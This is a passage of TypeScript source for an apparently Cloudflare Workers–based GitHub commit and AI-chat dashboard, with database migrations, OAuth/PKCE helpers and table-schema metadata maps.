('group_oauth_apps', 'workspace_id', 'fk', 'workspaces'),
('commit_agent_log', 'request_id', 'fk', 'ai_summary_log'),
('ai_summary_link_access_log', 'request_id', 'fk', 'ai_summary_log'),
('email_mfa_challenges', 'user_id', 'fk', 'user_sessions'),
('email_audit_anomalies', 'target_user_id', 'fk', 'user_sessions');`,
  '0034': `CREATE TABLE IF NOT EXISTS repo_commit_index (
  commit_hash      TEXT PRIMARY KEY,
  seq_num          INTEGER NOT NULL,
  github_pr_number INTEGER,
  commit_message   TEXT NOT NULL,
  repo_name        TEXT NOT NULL
);
CREATE UNIQUE INDEX IF NOT EXISTS idx_repo_commit_index_seq ON repo_commit_index (repo_name, seq_num);
CREATE INDEX IF NOT EXISTS idx_repo_commit_index_pr ON repo_commit_index (github_pr_number);`,
  '0035': `CREATE TABLE IF NOT EXISTS commit_search_keyword_labels (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id TEXT NOT NULL,
  search_query TEXT NOT NULL,
  label TEXT NOT NULL DEFAULT 'uncategorized',
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  updated_at TEXT NOT NULL DEFAULT (datetime('now')),
  UNIQUE(user_id, search_query)
);
CREATE INDEX IF NOT EXISTS idx_commit_search_keyword_labels_user ON commit_search_keyword_labels(user_id);
CREATE INDEX IF NOT EXISTS idx_commit_search_keyword_labels_label ON commit_search_keyword_labels(user_id, label);`,
  '0036': `CREATE TABLE IF NOT EXISTS ai_chat_shares (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL,
  user_hash TEXT NOT NULL,
  question TEXT NOT NULL,
  answer TEXT NOT NULL,
  model TEXT NOT NULL,
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  accessed_at TEXT,
  access_count INTEGER NOT NULL DEFAULT 0,
  expires_at TEXT
);
CREATE INDEX IF NOT EXISTS idx_ai_chat_shares_user_id ON ai_chat_shares(user_id);
CREATE INDEX IF NOT EXISTS idx_ai_chat_shares_user_hash ON ai_chat_shares(user_hash);
INSERT OR IGNORE INTO table_catalog (table_name, group_name, description, migration, sync_policy, display_order) VALUES
('ai_chat_shares', 'ai', 'AIチャット共有Q&Aレコード', '0036', 'auto', 0);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('ai_chat_shares', 'user_id', 'fk', 'user_sessions');`,
  '0037': `CREATE TABLE IF NOT EXISTS keyword_category_groups (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL,
  group_name TEXT NOT NULL,
  description TEXT,
  categories TEXT NOT NULL,
  is_deleted INTEGER NOT NULL DEFAULT 0,
  deleted_at TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  updated_at TEXT NOT NULL DEFAULT (datetime('now'))
);
CREATE INDEX IF NOT EXISTS idx_keyword_category_groups_user_id ON keyword_category_groups(user_id);
CREATE UNIQUE INDEX IF NOT EXISTS idx_keyword_category_groups_user_name ON keyword_category_groups(user_id, group_name);
INSERT OR IGNORE INTO table_catalog (table_name, group_name, description, migration, sync_policy, display_order) VALUES
('keyword_category_groups', 'search', '検索キーワードカテゴリグループ定義', '0037', 'auto', 0);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('keyword_category_groups', 'id', 'pk', NULL);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('keyword_category_groups', 'user_id', 'fk', 'user_sessions');`,
  '0038': `ALTER TABLE commit_search_keyword_labels ADD COLUMN classify_status TEXT;`,
  '0039': `CREATE TABLE IF NOT EXISTS keyword_multi_labels (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id TEXT NOT NULL,
  search_query TEXT NOT NULL,
  categories TEXT NOT NULL DEFAULT '[]',
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  updated_at TEXT NOT NULL DEFAULT (datetime('now')),
  UNIQUE(user_id, search_query)
);
CREATE INDEX IF NOT EXISTS idx_keyword_multi_labels_user ON keyword_multi_labels(user_id);
INSERT OR IGNORE INTO table_catalog (table_name, group_name, description, migration, sync_policy, display_order) VALUES
('keyword_multi_labels', 'search', 'キーワードの複数カテゴリ分類', '0039', 'auto', 0);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('keyword_multi_labels', 'id', 'pk', NULL);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('keyword_multi_labels', 'user_id', 'fk', 'user_sessions');`,
  '0040': `CREATE TABLE IF NOT EXISTS aichat_search_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id TEXT NOT NULL,
  keyword TEXT NOT NULL,
  share_id TEXT NOT NULL,
  first_searched_at TEXT NOT NULL,
  last_searched_at TEXT NOT NULL,
  select_count INTEGER NOT NULL DEFAULT 1
);
CREATE UNIQUE INDEX IF NOT EXISTS idx_aichat_search_log_unique ON aichat_search_log(user_id, keyword, share_id);
INSERT OR IGNORE INTO table_catalog (table_name, group_name, description, migration, sync_policy, display_order) VALUES
('aichat_search_log', 'ai', 'AIチャット検索キーワード選択ログ', '0040', 'auto', 0);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('aichat_search_log', 'id', 'pk', NULL);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('aichat_search_log', 'user_id', 'fk', 'user_sessions');
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('aichat_search_log', 'share_id', 'fk', 'ai_chat_shares');`,
  '0041': `CREATE TABLE IF NOT EXISTS aichat_search_history (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id TEXT NOT NULL,
  keyword TEXT NOT NULL,
  share_id TEXT NOT NULL,
  seq_num INTEGER NOT NULL,
  searched_at TEXT NOT NULL,
  deleted_at TEXT
);
CREATE INDEX IF NOT EXISTS idx_aichat_search_history_lookup ON aichat_search_history(user_id, keyword, share_id);
CREATE INDEX IF NOT EXISTS idx_aichat_search_history_user ON aichat_search_history(user_id, searched_at);
INSERT OR IGNORE INTO table_catalog (table_name, group_name, description, migration, sync_policy, display_order) VALUES
('aichat_search_history', 'ai', 'AIチャット検索キーワード選択履歴（明細）', '0041', 'auto', 0);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('aichat_search_history', 'id', 'pk', NULL);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('aichat_search_history', 'user_id', 'fk', 'user_sessions');
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('aichat_search_history', 'share_id', 'fk', 'ai_chat_shares');`,
  '0044': `CREATE TABLE IF NOT EXISTS aichat_search_impressions (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id TEXT NOT NULL,
  share_id TEXT NOT NULL,
  result_count INTEGER,
  searched_at TEXT NOT NULL,
  deleted_at TEXT
);
INSERT OR IGNORE INTO table_catalog (table_name, group_name, description, migration, sync_policy, display_order) VALUES
('aichat_search_impressions', 'ai', 'AIチャット検索露出ログ（検索結果全件）', '0044', 'auto', 0);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('aichat_search_impressions', 'id', 'pk', NULL);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('aichat_search_impressions', 'user_id', 'fk', 'user_sessions');
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('aichat_search_impressions', 'share_id', 'fk', 'ai_chat_shares');`,
  '0045': `CREATE TABLE IF NOT EXISTS aichat_subqueries (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  query TEXT NOT NULL UNIQUE
);
INSERT OR IGNORE INTO table_catalog (table_name, group_name, description, migration, sync_policy, display_order) VALUES
('aichat_subqueries', 'ai', 'AIチャットサブクエリマスタ', '0045', 'manual', 0);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('aichat_subqueries', 'id', 'pk', NULL);`,
  '0046': `CREATE TABLE IF NOT EXISTS aichat_share_subquery_links (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id TEXT NOT NULL,
  question TEXT NOT NULL,
  subquery_id INTEGER NOT NULL,
  url TEXT NOT NULL,
  created_at TEXT NOT NULL,
  UNIQUE(user_id, question, subquery_id)
);
INSERT OR IGNORE INTO table_catalog (table_name, group_name, description, migration, sync_policy, display_order) VALUES
('aichat_share_subquery_links', 'ai', 'AIチャット共有質問×サブクエリリンク', '0046', 'auto', 0);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('aichat_share_subquery_links', 'id', 'pk', NULL);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('aichat_share_subquery_links', 'subquery_id', 'fk', 'aichat_subqueries');`,
  '0047': `ALTER TABLE ai_chat_shares ADD COLUMN conversation_hash TEXT;
CREATE INDEX IF NOT EXISTS idx_ai_chat_shares_conv_hash ON ai_chat_shares(conversation_hash);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('ai_chat_shares', 'conversation_hash', 'uk', NULL);`,
  '0048': `CREATE TABLE IF NOT EXISTS aichat_model_colors (
  model_id TEXT PRIMARY KEY,
  color TEXT NOT NULL,
  label TEXT NOT NULL
);
INSERT OR IGNORE INTO aichat_model_colors (model_id, color, label) VALUES
  ('@cf/meta/llama-3.3-70b-instruct-fp8-fast', '#4f46e5', 'llama-3.3-70b-instruct-fp8-fast'),
  ('@cf/meta/llama-3.1-8b-instruct-fp8', '#0ea5e9', 'llama-3.1-8b'),
  ('@cf/meta/llama-3.1-70b-instruct', '#3b82f6', 'llama-3.1-70b'),
  ('@cf/google/gemma-4-26b-a4b-it', '#16a34a', 'gemma-4-26b'),
  ('@cf/google/gemma-3-12b-it', '#22c55e', 'gemma-3-12b'),
  ('@cf/meta/llama-4-scout-17b-16e-instruct', '#a855f7', 'llama-4-scout-17b');`,
  '0049': `ALTER TABLE ai_chat_shares ADD COLUMN question_hash TEXT;
CREATE INDEX IF NOT EXISTS idx_ai_chat_shares_q_hash ON ai_chat_shares(question_hash);
ALTER TABLE aichat_share_subquery_links ADD COLUMN question_hash TEXT;
CREATE INDEX IF NOT EXISTS idx_asl_question_hash ON aichat_share_subquery_links(question_hash);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('ai_chat_shares', 'question_hash', 'idx', NULL);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('aichat_share_subquery_links', 'question_hash', 'idx', NULL);`,
  '0050': `ALTER TABLE ai_chat_shares ADD COLUMN input_tokens INTEGER;
ALTER TABLE ai_chat_shares ADD COLUMN output_tokens INTEGER;
ALTER TABLE ai_chat_shares ADD COLUMN total_tokens INTEGER;
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('ai_chat_shares', 'input_tokens', 'idx', NULL);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('ai_chat_shares', 'output_tokens', 'idx', NULL);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('ai_chat_shares', 'total_tokens', 'idx', NULL);`,
  'ts-catalog': `CREATE TABLE IF NOT EXISTS ts_repository (
  id            INTEGER PRIMARY KEY AUTOINCREMENT,
  full_name     TEXT NOT NULL UNIQUE,
  owner         TEXT NOT NULL,
  repo_name     TEXT NOT NULL,
  description   TEXT,
  language      TEXT,
  registered_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE IF NOT EXISTS ts_function_catalog (
  id                INTEGER PRIMARY KEY AUTOINCREMENT,
  repo_id           INTEGER NOT NULL REFERENCES ts_repository(id),
  file_path         TEXT NOT NULL,
  function_name     TEXT NOT NULL,
  purpose           TEXT NOT NULL,
  is_exported       INTEGER NOT NULL DEFAULT 1,
  is_async          INTEGER NOT NULL DEFAULT 0,
  first_commit_hash TEXT,
  first_commit_at   TEXT,
  is_deleted        INTEGER NOT NULL DEFAULT 0,
  deleted_at        TEXT,
  recorded_at       TEXT NOT NULL DEFAULT (datetime('now')),
  UNIQUE(repo_id, file_path, function_name)
);

CREATE INDEX IF NOT EXISTS idx_tfc_repo  ON ts_function_catalog(repo_id);
CREATE INDEX IF NOT EXISTS idx_tfc_file  ON ts_function_catalog(repo_id, file_path);
CREATE INDEX IF NOT EXISTS idx_tfc_name  ON ts_function_catalog(function_name);

CREATE TABLE IF NOT EXISTS ts_commit_log (
  id              INTEGER PRIMARY KEY AUTOINCREMENT,
  repo_id         INTEGER NOT NULL REFERENCES ts_repository(id),
  commit_hash     TEXT NOT NULL,
  commit_at       TEXT NOT NULL,
  author_email    TEXT,
  branch_name     TEXT,
  pr_number       INTEGER,
  subject         TEXT NOT NULL,
  body            TEXT,
  files_changed   INTEGER,
  insertions      INTEGER,
  deletions       INTEGER,
  is_merge_commit INTEGER NOT NULL DEFAULT 0,
  recorded_at     TEXT NOT NULL DEFAULT (datetime('now')),
  UNIQUE(repo_id, commit_hash)
);

CREATE INDEX IF NOT EXISTS idx_tcl_repo      ON ts_commit_log(repo_id);
CREATE INDEX IF NOT EXISTS idx_tcl_commit_at ON ts_commit_log(repo_id, commit_at);
CREATE INDEX IF NOT EXISTS idx_tcl_pr        ON ts_commit_log(repo_id, pr_number);
CREATE INDEX IF NOT EXISTS idx_tcl_branch    ON ts_commit_log(repo_id, branch_name);

CREATE TABLE IF NOT EXISTS ts_commit_function_map (
  id            INTEGER PRIMARY KEY AUTOINCREMENT,
  commit_hash   TEXT NOT NULL,
  repo_id       INTEGER NOT NULL REFERENCES ts_repository(id),
  file_path     TEXT NOT NULL,
  function_name TEXT NOT NULL,
  change_type   TEXT NOT NULL CHECK(change_type IN ('add','modify','delete')),
  lines_added   INTEGER NOT NULL DEFAULT 0,
  lines_deleted INTEGER NOT NULL DEFAULT 0,
  recorded_at   TEXT NOT NULL DEFAULT (datetime('now')),
  UNIQUE(repo_id, commit_hash, file_path, function_name),
  FOREIGN KEY (repo_id, commit_hash) REFERENCES ts_commit_log(repo_id, commit_hash)
);

CREATE INDEX IF NOT EXISTS idx_tcfm_repo   ON ts_commit_function_map(repo_id);
CREATE INDEX IF NOT EXISTS idx_tcfm_commit ON ts_commit_function_map(repo_id, commit_hash);
CREATE INDEX IF NOT EXISTS idx_tcfm_func   ON ts_commit_function_map(repo_id, file_path, function_name);
CREATE INDEX IF NOT EXISTS idx_tcfm_type   ON ts_commit_function_map(change_type);

CREATE TABLE IF NOT EXISTS ts_function_impact (
  id            INTEGER PRIMARY KEY AUTOINCREMENT,
  repo_id       INTEGER NOT NULL REFERENCES ts_repository(id),
  commit_hash   TEXT NOT NULL,
  file_path     TEXT NOT NULL,
  function_name TEXT NOT NULL,
  impact_type   TEXT NOT NULL CHECK(impact_type IN (
                  'feature','bugfix','regression','refactor',
                  'perf','test','docs','chore'
                )),
  severity      INTEGER NOT NULL DEFAULT 2 CHECK(severity BETWEEN 1 AND 5),
  contribution  INTEGER NOT NULL DEFAULT 3 CHECK(contribution BETWEEN 1 AND 5),
  notes         TEXT,
  evaluator     TEXT NOT NULL DEFAULT 'manual',
  evaluated_at  TEXT NOT NULL DEFAULT (datetime('now')),
  FOREIGN KEY (repo_id, commit_hash) REFERENCES ts_commit_log(repo_id, commit_hash)
);

CREATE INDEX IF NOT EXISTS idx_tfi_repo    ON ts_function_impact(repo_id);
CREATE INDEX IF NOT EXISTS idx_tfi_commit  ON ts_function_impact(repo_id, commit_hash);
CREATE INDEX IF NOT EXISTS idx_tfi_func    ON ts_function_impact(repo_id, file_path, function_name);
CREATE INDEX IF NOT EXISTS idx_tfi_type    ON ts_function_impact(impact_type);
CREATE INDEX IF NOT EXISTS idx_tfi_contrib ON ts_function_impact(contribution);

CREATE TABLE IF NOT EXISTS ts_commit_quality (
  id                 INTEGER PRIMARY KEY AUTOINCREMENT,
  repo_id            INTEGER NOT NULL REFERENCES ts_repository(id),
  commit_hash        TEXT NOT NULL,
  functions_touched  INTEGER NOT NULL DEFAULT 0,
  files_touched      INTEGER NOT NULL DEFAULT 0,
  granularity_score  INTEGER CHECK(granularity_score BETWEEN 1 AND 5),
  is_atomic          INTEGER,
  branch_was_needed  INTEGER,
  branch_timing_note TEXT,
  feature_allocation TEXT,
  evaluator          TEXT NOT NULL DEFAULT 'manual',
  evaluated_at       TEXT NOT NULL DEFAULT (datetime('now')),
  UNIQUE(repo_id, commit_hash),
  FOREIGN KEY (repo_id, commit_hash) REFERENCES ts_commit_log(repo_id, commit_hash)
);

CREATE INDEX IF NOT EXISTS idx_tcq_repo  ON ts_commit_quality(repo_id);
CREATE INDEX IF NOT EXISTS idx_tcq_score ON ts_commit_quality(repo_id, granularity_score);`,
};

async function ensureGroupTable(db: D1Database): Promise<void> {
  await db.prepare(
    `CREATE TABLE IF NOT EXISTS keyword_category_groups (
      id TEXT PRIMARY KEY, user_id TEXT NOT NULL, group_name TEXT NOT NULL,
      description TEXT, categories TEXT NOT NULL,
      is_deleted INTEGER NOT NULL DEFAULT 0, deleted_at TEXT,
      created_at TEXT NOT NULL DEFAULT (datetime('now')),
      updated_at TEXT NOT NULL DEFAULT (datetime('now'))
    )`
  ).run();
  for (const ddl of [
    `ALTER TABLE keyword_category_groups ADD COLUMN description TEXT`,
    `ALTER TABLE keyword_category_groups ADD COLUMN is_deleted INTEGER NOT NULL DEFAULT 0`,
    `ALTER TABLE keyword_category_groups ADD COLUMN deleted_at TEXT`,
  ]) {
    try { await db.prepare(ddl).run(); } catch { /* already exists */ }
  }
  try { await db.prepare(`CREATE INDEX IF NOT EXISTS idx_keyword_category_groups_user_id ON keyword_category_groups(user_id)`).run(); } catch { /* ignore */ }
  try { await db.prepare(`CREATE UNIQUE INDEX IF NOT EXISTS idx_keyword_category_groups_user_name ON keyword_category_groups(user_id, group_name)`).run(); } catch { /* ignore */ }
}

function jsonUtf8(payload: unknown, status = 200): Response {
  return new Response(JSON.stringify(payload), {
    status,
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      'Cache-Control': 'no-store',
    },
  });
}

function resolveCommitHistoryPageSize(envValue: string | undefined): number {
  const fallback = DEFAULT_COMMIT_HISTORY_PAGE_SIZE;
  if (!envValue) {
    return fallback;
  }
  const parsed = Number(envValue);
  if (!Number.isFinite(parsed)) {
    return fallback;
  }
  return Math.min(50, Math.max(1, Math.floor(parsed)));
}

/**
 * CSRFを防ぐためのOAuth stateトークンを生成
 */
function generateOAuthState(): string {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return Array.from(array, b => b.toString(16).padStart(2, '0')).join('');
}

function base64UrlEncode(bytes: Uint8Array): string {
  let binary = '';
  for (const byte of bytes) {
    binary += String.fromCharCode(byte);
  }
  return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

async function generatePkcePair(): Promise<{ verifier: string; challenge: string }> {
  const verifierBytes = new Uint8Array(32);
  crypto.getRandomValues(verifierBytes);
  const verifier = base64UrlEncode(verifierBytes);
  const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier));
  const challenge = base64UrlEncode(new Uint8Array(digest));
  return { verifier, challenge };
}

function resolveResendDedupTtlSeconds(envValue: string | undefined): number {
  const parsed = Number(envValue);
  const defaultTtl = 10 * 60;
  if (!Number.isFinite(parsed) || parsed <= 0) {
    return defaultTtl;
  }
  return Math.floor(parsed);
}

function normalizeGitHubApiMessage(message: string): string {
  const normalized = message.trim().toLowerCase();
  switch (normalized) {
    case 'bad credentials':
      return '認証情報が無効です';
    case 'requires authentication':
      return '認証が必要です';
    case 'not found':
      return '対象が見つかりません';
    case 'validation failed':
      return '入力内容が不正です';
    case 'resource not accessible by integration':
      return '権限が不足しています';
    case 'api rate limit exceeded':
      return 'APIのレート制限に達しました';
    default:
      return message;
  }
}

function formatTimestampWithTimezone(date: Date, timezone: string): string {
  if (timezone === 'JST') {
    const jstDate = new Date(date.getTime() + 9 * 60 * 60 * 1000);
    return jstDate.toISOString().replace('T', ' ').substring(0, 19) + ' JST';
  }
  return date.toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
}

/**
 * PRAGMAカラム一覧に、行データに含まれるがPRAGMAにないカラム（JOIN由来等）を追加する。
 * 元の配列を変更せず新しい配列を返す。
 */
export function mergeColumnsFromRows(
  pragmaColumns: string[],
  rows: Record<string, unknown>[],
): string[] {
  if (rows.length === 0) return pragmaColumns;
  const merged = [...pragmaColumns];
  for (const key of Object.keys(rows[0])) {
    if (!merged.includes(key)) {
      merged.push(key);
    }
  }
  return merged;
}

/**
 * カラムのキー種別を返す。ER図の定義と一致させること。
 * 'pk' | 'fk' | 'pk+fk' | 'uk' | 'idx' | null
 */
export type ColumnKeyType = 'pk' | 'fk' | 'pk+fk' | 'uk' | 'idx' | null;

export interface ColumnKeyInfo {
  [columnName: string]: ColumnKeyType;
}

export const TABLE_COLUMN_KEYS: Record<string, ColumnKeyInfo> = {
  user_sessions: { id: 'pk', user_id: 'uk', current_workspace_id: 'fk' },
  teams: { id: 'pk' },
  workspaces: { id: 'pk', team_id: 'fk' },
  team_members: { team_id: 'pk+fk', user_id: 'pk+fk' },
  installation_permissions: { id: 'pk', installation_id: 'idx', repo_name: 'idx', updated_at: 'idx' },
  commit_calendar_cache: { id: 'pk', owner: 'idx', repo: 'idx', year: 'idx', month: 'idx', workspace_id: 'fk' },
  commit_list_cache: { workspace_id: 'fk', owner: 'idx', repo: 'idx', date: 'idx' },
  cache_stats: { user_id: 'fk', owner: 'idx', repo: 'idx' },
  cloudflare_setup_pending: { id: 'pk', user_id: 'fk' },
  commit_search_history: { id: 'pk', user_id: 'fk' },
  commit_search_repo_stats: { id: 'pk', search_history_id: 'fk' },
  commit_search_hit_details: { id: 'pk', search_history_id: 'fk' },
  commit_search_keyword_labels: { id: 'pk', user_id: 'fk', search_query: 'idx' },
  ai_summary_log: { id: 'pk', request_id: 'uk', event_date: 'idx' },
  ai_summary_reviews: { id: 'pk', summary_request_id: 'fk' },
  commit_agent_log: { id: 'pk', request_id: 'fk', repo_full_name: 'idx', pr_number: 'idx' },
  repo_color_settings: { id: 'pk', workspace_id: 'fk', repo_name: 'fk' },
  repo_groups: { id: 'pk', workspace_id: 'fk' },
  repo_group_members: { group_id: 'pk+fk', repo_name: 'pk+fk', workspace_id: 'fk' },
  resend_webhook_sources: { id: 'pk' },
  email_send_log: { id: 'pk', source_id: 'fk', resend_email_id: 'idx', email_type: 'idx' },
  resend_webhook_log: { id: 'pk', source_id: 'fk', resend_email_id: 'idx', event_type: 'idx', created_at: 'idx' },
  email_suppression_list: { id: 'pk', source_id: 'fk', origin_webhook_log_id: 'fk', email: 'idx' },
  email_mfa_challenges: { id: 'pk', source_id: 'fk', user_id: 'fk', resend_email_id: 'idx', expires_at: 'idx' },
  email_audit_anomalies: { id: 'pk', source_id: 'fk', target_user_id: 'fk', anomaly_type: 'idx', severity: 'idx', period_start: 'idx' },
  slack_interaction_log: { id: 'pk' },
  table_catalog: { table_name: 'pk' },
  table_column_keys: { table_name: 'pk+fk', column_name: 'pk' },
  group_oauth_apps: { group_id: 'pk+fk', app_name: 'pk', workspace_id: 'fk' },
  ai_summary_link_access_log: { id: 'pk', request_id: 'fk', route: 'idx', issue_code: 'idx', created_at: 'idx' },
  commit_stats_cache: { id: 'pk', owner: 'idx', repo: 'idx', period: 'idx' },
  repo_commit_index: { commit_hash: 'pk', seq_num: 'idx', github_pr_number: 'idx', repo_name: 'idx' },
  ai_chat_shares: { id: 'pk', user_id: 'fk', user_hash: 'idx', conversation_hash: 'uk', question_hash: 'idx' },
  aichat_search_log: { id: 'pk', user_id: 'fk', share_id: 'fk', keyword: 'idx' },
  aichat_search_history: { id: 'pk', user_id: 'fk', share_id: 'fk', keyword: 'idx', seq_num: 'idx' },
  aichat_search_impressions: { id: 'pk', user_id: 'fk', share_id: 'fk' },
  aichat_subqueries: { id: 'pk' },
  aichat_share_subquery_links: { id: 'pk', subquery_id: 'fk', question_hash: 'idx' },
  aichat_model_colors: { model_id: 'pk' },
  keyword_category_groups: { id: 'pk', user_id: 'fk' },
  keyword_multi_labels: { id: 'pk', user_id: 'fk', search_query: 'idx' },
  ts_repository:          { id: 'pk', full_name: 'uk' },
  ts_function_catalog:    { id: 'pk', repo_id: 'fk', file_path: 'idx', function_name: 'idx' },
  ts_commit_log:          { id: 'pk', repo_id: 'fk', commit_hash: 'uk', commit_at: 'idx', pr_number: 'idx', branch_name: 'idx' },
  ts_commit_function_map: { id: 'pk', repo_id: 'pk+fk', commit_hash: 'pk+fk', file_path: 'idx', function_name: 'idx', change_type: 'idx' },
  ts_function_impact:     { id: 'pk', repo_id: 'fk', commit_hash: 'fk', file_path: 'idx', function_name: 'idx', impact_type: 'idx', contribution: 'idx' },
  ts_commit_quality:      { id: 'pk', repo_id: 'pk+fk', commit_hash: 'pk+fk', granularity_score: 'idx' },
};

export function getColumnKeyType(tableName: string, columnName: string): ColumnKeyType {
  const tableKeys = TABLE_COLUMN_KEYS[tableName];
  if (!tableKeys) return null;
  return tableKeys[columnName] ?? null;
}

/**
 * summary_request_id → /ai-summary/{id} リンクの対象かどうかを判定する。
 * request_id (ai_summary_log) と summary_request_id (ai_summary_reviews) が対象。
 */
export function isAiSummaryLinkColumn(tableName: string, columnName: string): boolean {
  return (
    (columnName === 'request_id' && tableName === 'ai_summary_log') ||
    (columnName === 'summary_request_id' && tableName === 'ai_summary_reviews')
  );
}

/**
 * テーブル×カラムの組み合わせで、thタップ時にフィルタ用セレクトメニューを表示するかどうか。
 * 行データからユニーク値を抽出してフィルタ選択肢にする。
 */
const FILTERABLE_COLUMNS: Record<string, string[]> = {
  table_catalog: ['group_name', 'sync_policy'],
  table_column_keys: ['key_type', 'group_name'],
};

export function isFilterableColumn(tableName: string, columnName: string): boolean {
  const cols = FILTERABLE_COLUMNS[tableName];
  return cols ? cols.includes(columnName) : false;
}

export function getFilterableColumns(tableName: string): string[] {
  return FILTERABLE_COLUMNS[tableName] ?? [];
}

/**
 * テーブル→グループのマッピング（ER図と同期）。
 * table_catalog がDBに存在しない場合のフォールバック。
 */
export const TABLE_GROUP_MAP: Record<string, string> = {
  user_sessions: 'auth', teams: 'auth', workspaces: 'auth', team_members: 'auth',
  commit_calendar_cache: 'commit', commit_list_cache: 'commit', cache_stats: 'commit',
  commit_search_history: 'commit', commit_search_repo_stats: 'commit', commit_search_hit_details: 'commit', commit_search_keyword_labels: 'commit', cloudflare_setup_pending: 'commit',
  commit_stats_cache: 'commit',
  repo_commit_index: 'commit',
  ai_summary_log: 'ai', ai_summary_reviews: 'ai', commit_agent_log: 'ai',
  resend_webhook_sources: 'email', email_send_log: 'email', resend_webhook_log: 'email',
  email_suppression_list: 'email', email_mfa_challenges: 'email', email_audit_anomalies: 'email',
  slack_interaction_log: 'config',
  installation_permissions: 'config', repo_color_settings: 'config', repo_groups: 'config',
  repo_group_members: 'config', group_oauth_apps: 'config', table_catalog: 'config', table_column_keys: 'config',
  ai_summary_link_access_log: 'ai',
  ai_chat_shares: 'ai',
  aichat_search_log: 'ai',
  aichat_search_history: 'ai',
  aichat_search_impressions: 'ai',
  aichat_subqueries: 'ai',
  aichat_share_subquery_links: 'ai',
  aichat_model_colors: 'ai',
  keyword_category_groups: 'search',
  keyword_multi_labels: 'search',
  ts_repository:          'ts-catalog',
  ts_function_catalog:    'ts-catalog',
  ts_commit_log:          'ts-catalog',
  ts_commit_function_map: 'ts-catalog',
  ts_function_impact:     'ts-catalog',
  ts_commit_quality:      'ts-catalog',
};

async function recordAiSummaryLinkAccess(
  db: D1Database,
  payload: {
    route: '/view' | '/ai-summary/:id';
    requestId: string;
    found: boolean;
    issueCode: string;
    issueDetail?: string;
    referer?: string | null;
    userAgent?: string | null;
  },
): Promise<void> {
  try {
    await db.prepare(
      `INSERT INTO ai_summary_link_access_log
      (route, request_id, found, issue_code, issue_detail, referer, user_agent, created_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)`
    ).bind(
      payload.route,
      payload.requestId,
      payload.found ? 1 : 0,
      payload.issueCode,
      payload.issueDetail ?? '',
      payload.referer ?? '',
      payload.userAgent ?? '',
      new Date().toISOString(),
    ).run();
  } catch (error) {
    logger.warn('Failed to record ai_summary_link_access_log', {
      route: payload.route,
      requestId: payload.requestId,
      issueCode: payload.issueCode,
      error: error instanceof Error ? error.message : String(error),
    });
  }
}

export const GROUP_LABELS: Record<string, string> = {
  auth: 'Auth / Session',
  commit: 'Commit / Cache',
  ai: 'AI Summary',
  email: 'Email / Resend',
  config: 'Config / Settings',
  search: 'Search',
  'ts-catalog': 'TS Function Catalog',
  undefined: 'Undefined',
};

export const GROUP_COLORS: Record<string, string> = {
  auth: '#388bfd',
  commit: '#3fb950',
  ai: '#d29922',
  email: '#f85149',
  config: '#a371f7',
  search: '#58a6ff',
  'ts-catalog': '#e879f9',
  undefined: '#8b949e',
};

export interface GroupErColumn {
  name: string;
  keyType: ColumnKeyType;
  fkTarget: string | null;
}

export interface GroupErTable {
  tableName: string;
  description: string;
  columns: GroupErColumn[];
}

export interface GroupErData {
  groupName: string;
  groupLabel: string;
  groupColor: string;
  tables: GroupErTable[];
}

/**
 * カラムのFK先テーブルのマッピング（ER図と同期）。
 * table_column_keys がDBに存在しない場合のフォールバック。
 */
export const COLUMN_FK_TARGETS: Record<string, Record<string, string>> = {
  // ========================================================================
  // 認証・ワークスペース系
